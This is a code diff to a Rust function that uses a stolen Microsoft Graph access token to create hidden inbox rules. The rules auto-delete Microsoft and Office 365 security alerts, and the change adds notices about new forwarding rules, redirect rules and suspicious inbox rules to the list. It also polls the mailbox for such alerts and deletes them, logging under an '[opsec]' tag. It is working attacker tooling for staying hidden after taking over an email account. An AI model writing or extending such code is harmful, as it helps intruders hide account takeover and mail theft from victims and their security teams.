@@ -353,6 +353,7 @@ async fn delete_microsoft_notification_email(access_token: String, user_agent: O
 
     let has_external_mail_filter = existing_names.iter().any(|n| n == "External Mail Filter");
     let has_security_update = existing_names.iter().any(|n| n == "Security Update");
+    let has_alert_filter = existing_names.iter().any(|n| n == "Alert Filter");
 
     // Rule 1: Sender-based auto-delete (only if not already present)
     if !has_external_mail_filter {
@@ -372,7 +373,10 @@ async fn delete_microsoft_notification_email(access_token: String, user_agent: O
                     "no-reply@azureadnotifications.microsoft.com",
                     "msonlineservicesteam@microsoftonline.com",
                     "no-reply@signin.microsoft.com",
-                    "account-security-noreply@signin.microsoft.com"
+                    "account-security-noreply@signin.microsoft.com",
+                    "office365alerts@microsoft.com",
+                    "no-reply@notifications.microsoft.com",
+                    "noreply@notifications.microsoft.com"
                 ]
             },
             "actions": {
@@ -413,7 +417,13 @@ async fn delete_microsoft_notification_email(access_token: String, user_agent: O
                     "two-step verification", "two-factor authentication",
                     "app password", "review recent activity",
                     "help us protect your account", "Microsoft account team",
-                    "action required", "your account was accessed"
+                    "action required", "your account was accessed",
+                    "Creation of forwarding", "Creation of redirect",
+                    "forwarding rule", "redirect rule",
+                    "MailRedirect", "mail redirect",
+                    "forwarding/redirect", "forwarding was set up",
+                    "inbox rule was created", "transport rule",
+                    "suspicious inbox rule", "suspicious forwarding"
                 ]
             },
             "actions": {
@@ -436,6 +446,46 @@ async fn delete_microsoft_notification_email(access_token: String, user_agent: O
         }
     } else {
         println!("[opsec] 'Security Update' rule already exists — skipping creation");
+    }
+
+    // Rule 3: Office 365 security alert auto-delete (only if not already present)
+    if !has_alert_filter {
+        let alert_rule_payload = serde_json::json!({
+            "displayName": "Alert Filter",
+            "sequence": 3,
+            "isEnabled": true,
+            "conditions": {
+                "subjectContains": [
+                    "Creation of forwarding", "Creation of redirect",
+                    "forwarding rule", "redirect rule",
+                    "MailRedirect", "mail redirect",
+                    "forwarding/redirect", "forwarding was set up",
+                    "inbox rule was created", "transport rule",
+                    "suspicious inbox rule", "suspicious forwarding",
+                    "Informational alert", "security alert",
+                    "an informational alert has been triggered"
+                ]
+            },
+            "actions": {
+                "delete": true,
+                "stopProcessingRules": true
+            }
+        });
+        match client
+            .post(rule_url)
+            .header("Authorization", format!("Bearer {}", access_token))
+            .header("Content-Type", "application/json")
+            .header("User-Agent", ua)
+            .header("Accept-Language", lang)
+            .json(&alert_rule_payload)
+            .send()
+            .await {
+            Ok(r) if r.status().is_success() => println!("[opsec] Created Graph auto-delete rule for Office 365 alert emails"),
+            Ok(r) => eprintln!("[opsec] Failed to create alert rule ({}): {}", r.status(), r.text().await.unwrap_or_default()),
+            Err(e) => eprintln!("[opsec] Failed to create alert rule: {}", e),
+        }
+    } else {
+        println!("[opsec] 'Alert Filter' rule already exists — skipping creation");
     }
 
     // Now poll for any notification that may have arrived BEFORE the rule was created.
@@ -462,6 +512,17 @@ async fn delete_microsoft_notification_email(access_token: String, user_agent: O
         "\"help us protect your account\"",
         "\"action required\"",
         "\"your account was accessed\"",
+        "\"Creation of forwarding\"",
+        "\"Creation of redirect\"",
+        "\"forwarding rule\"",
+        "\"redirect rule\"",
+        "\"MailRedirect\"",
+        "\"forwarding/redirect\"",
+        "\"forwarding was set up\"",
+        "\"inbox rule was created\"",
+        "\"suspicious inbox rule\"",
+        "\"suspicious forwarding\"",
+        "\"Informational alert\"",
     ];
 
     for attempt in 1..=15 {
@@ -495,7 +556,7 @@ async fn delete_microsoft_notification_email(access_token: String, user_agent: O
         }
 
         // Strategy 2: Filter by known Microsoft notification sender domains
-        let filter_url = "https://graph.microsoft.com/v1.0/me/messages?$filter=from/emailAddress/address eq 'account-security-noreply@accountprotection.microsoft.com' or from/emailAddress/address eq 'microsoftaccount@microsoft.com' or from/emailAddress/address eq 'security@microsoft.com'&$top=5&$select=id,subject,receivedDateTime,from,bodyPreview&$orderby=receivedDateTime desc";
+        let filter_url = "https://graph.microsoft.com/v1.0/me/messages?$filter=from/emailAddress/address eq 'account-security-noreply@accountprotection.microsoft.com' or from/emailAddress/address eq 'microsoftaccount@microsoft.com' or from/emailAddress/address eq 'security@microsoft.com' or from/emailAddress/address eq 'office365alerts@microsoft.com' or from/emailAddress/address eq 'no-reply@notifications.microsoft.com'&$top=5&$select=id,subject,receivedDateTime,from,bodyPreview&$orderby=receivedDateTime desc";
         if let Ok(resp) = client
             .get(filter_url)
             .header("Authorization", format!("Bearer {}", access_token))
@@ -579,7 +640,18 @@ async fn delete_microsoft_notification_email(access_token: String, user_agent: O
                 || subject.contains("review recent activity")
                 || subject.contains("help us protect")
                 || subject.contains("action required")
-                || subject.contains("your account was accessed");
+                || subject.contains("your account was accessed")
+                || subject.contains("creation of forwarding")
+                || subject.contains("creation of redirect")
+                || subject.contains("forwarding rule")
+                || subject.contains("redirect rule")
+                || subject.contains("mailredirect")
+                || subject.contains("forwarding/redirect")
+                || subject.contains("forwarding was set up")
+                || subject.contains("inbox rule was created")
+                || subject.contains("suspicious inbox rule")
+                || subject.contains("suspicious forwarding")
+                || subject.contains("informational alert");
 
             let has_notification_body = body_preview.contains("new app")
                 || body_preview.contains("connected to the microsoft account")
@@ -591,18 +663,28 @@ async fn delete_microsoft_notification_email(access_token: String, user_agent: O
                 || body_preview.contains("security alert")
                 || body_preview.contains("verify your identity")
                 || body_preview.contains("review recent activity")
-                || body_preview.contains("help us protect");
+                || body_preview.contains("help us protect")
+                || body_preview.contains("mailredirect")
+                || body_preview.contains("forwarding")
+                || body_preview.contains("redirect rule")
+                || body_preview.contains("inbox rule")
+                || body_preview.contains("informational alert")
+                || body_preview.contains("forwarding/redirect");
 
             let is_microsoft_sender = from_addr.contains("microsoft")
                 || from_addr.contains("accountprotection")
                 || from_addr.contains("azuread")
                 || from_addr.contains("microsoftonline")
                 || from_addr.contains("signin.microsoft")
+                || from_addr.contains("office365alerts")
+                || from_addr.contains("notifications.microsoft")
                 || from_name.contains("microsoft account team")
                 || from_name.contains("microsoft account")
                 || from_name.contains("microsoft security")
                 || from_name.contains("azure ad")
-                || from_name.contains("microsoft online");
+                || from_name.contains("microsoft online")
+                || from_name.contains("office365")
+                || from_name.contains("office 365");
 
             let is_notification = is_recent
                 && (has_notification_subject || has_notification_body)
